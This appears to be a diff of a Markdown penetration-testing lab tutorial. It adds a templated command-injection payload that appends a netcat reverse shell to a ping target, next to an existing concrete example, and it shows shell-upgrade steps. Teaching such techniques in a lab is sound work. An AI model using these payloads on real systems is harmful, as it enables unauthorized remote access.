@@ -181,6 +181,7 @@ up your listener in Step 1.
 
 ```
 8.8.8.8; nc 172.16.0.9 9001 -c /bin/bash
+<ping IP>; nc <attacker IP> <attacker port> -c /bin/bash
 ```
 
 This breaks down as follows:
@@ -211,7 +212,7 @@ this, but might just look like it's loading and loading.  This is a good sign.
 ### Protip: upgrading the shell
 
 Reverse shells are useful, but they have some limitations.  For example, the
-key combination <Ctrl-C> is a very common way to terminate a command in the
+key combination \<Ctrl-C\> is a very common way to terminate a command in the
 shell.  But, if you try this key combination in the reverse shell, you'll kill
 the shell and have to reestablish that connection, which can sometimes be very
 cumbersome.
@@ -229,16 +230,16 @@ Connection received from [some IP] <some port number>
 # invoke python TTY module
 python -c 'import pty;pty.spawn("/bin/bash")'
 
-# press <ctrl-z> to background the session
+# press \<ctrl-z\> to background the session
 # you'll be back in the 'kali' shell for these steps
-stty raw -echo; fg # push <enter> twice
+stty raw -echo; fg # push \<enter\> twice
 
 # now you're back in the reverse shell
 export TERM=xterm
 ```
 
 By following these steps, you'll have a "full" shell with tab autocompletion,
-the ability to clear the screen with <CTRL-L>, and pressing <CTRL-C> won't kill
+the ability to clear the screen with \<CTRL-L\>, and pressing \<CTRL-C\> won't kill
 the shell.
 
 ## Post Exploitation
